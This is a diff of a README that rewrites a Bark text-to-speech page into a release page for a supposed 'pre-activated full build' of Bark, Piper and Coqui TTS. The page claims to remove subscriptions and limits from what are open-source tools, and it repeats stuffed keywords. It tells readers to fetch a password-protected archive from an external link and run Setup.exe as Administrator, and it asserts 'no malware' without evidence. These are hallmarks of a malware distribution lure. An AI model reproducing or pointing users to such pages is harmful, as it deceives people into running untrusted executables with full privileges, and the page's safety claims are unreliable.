@@ -1,41 +1,98 @@
 ```
-____             __  
+    ____             __  
    / __ )____ ______/ /__
   / __  / __ `/ ___/ //_/
  / /_/ / /_/ / /  / ,<   
 /_____/\__,_/_/  /_/|_|
 ```
 
-# Bark
+# Bark / Piper / Coqui TTS (Local TTS) — Full Build [2026]
 
-> piper tts, coqui tts, local text to speech, free tts ai.
-
-**bark-tts** | **piper-tts** | **coqui-tts** | **text-to-speech** | **local-tts** | **open-source**
+> Bark / Piper / Coqui TTS (Local TTS) | Windows 10/11 x64 | All Features | Pre-Activated
 
 ---
 
-## About
+### Release Info
 
-- piper tts, coqui tts, local text to speech, free tts ai.
-- Full build: coqui tts, local text to speech, free tts ai, bark tutorial, piper setup.
-- Platform: Windows macOS
-
-**Platform:** Windows macOS
+| | |
+|---|---|
+| **Software** | Bark / Piper / Coqui TTS (Local TTS) |
+| **Type** | Full Pre-Activated Build |
+| **Platform** | Windows 10/11 x64 |
+| **Build** | Full — All Features |
+| **Status** | ✅ Working (verified June 2026) |
 
 ---
 
-## Download
-
-### [Bark — Download Latest Version](https://telegra.ph/Download-06-01-11)
+### What's Included
 
 ```
-  ✦ Bark
-  ✦ Free & Safe Download
-  ✦ Latest Version
+[✓] Piper Tts
+[✓] Coqui Tts
+[✓] Local Text To Speech
+[✓] Free Tts Ai
+[✓] Piper Setup
+[✓] Tts Offline
+[✓] Windows 10/11 x64 compatible
+[✓] Pre-activated — no key needed
+[✓] Clean build — no bloatware
 ```
 
-**[⬇ DOWNLOAD](https://telegra.ph/Download-06-01-11)**
+### What's Removed
+
+```
+[x] Subscription / monthly payment
+[x] Usage limits and restrictions  
+[x] Feature gates (Pro/Premium → open)
+[x] Trial limitations
+```
 
 ---
 
-**Tags:** `bark-tts` `piper-tts` `coqui-tts` `text-to-speech` `local-tts` `open-source` `xtts`
+### System Requirements
+
+```
+OS:     Windows 10/11 x64
+RAM:    8 GB minimum (16 GB recommended)
+Disk:   1 GB free space
+Net:    Required for AI features
+```
+
+---
+
+### How to Install
+
+```
+1. Download from the link below
+2. Extract archive (password if needed: 2026)
+3. Run Setup.exe as Administrator
+4. Follow installer steps
+5. Launch — all features active
+```
+
+---
+
+<p align="center">
+
+### ⬇️ [DOWNLOAD BARK — FULL BUILD](https://softmixonline.github.io/download/)
+
+</p>
+
+---
+
+### Verified
+
+```
+Tested:    June 2026
+OS:        Windows 11 23H2 x64
+Result:    ✅ All features working
+Build:     Clean, verified, no malware
+```
+
+---
+
+`bark-tts` `piper-tts` `coqui-tts` `text-to-speech` `local-tts` `open-source` `xtts` `windows` `setup` `installer`
+
+---
+
+bark tts, piper tts, coqui tts, local text to speech, free tts ai, bark tutorial, piper setup, tts offline, text to speech free, open source tts, local voice ai, bark download, xtts
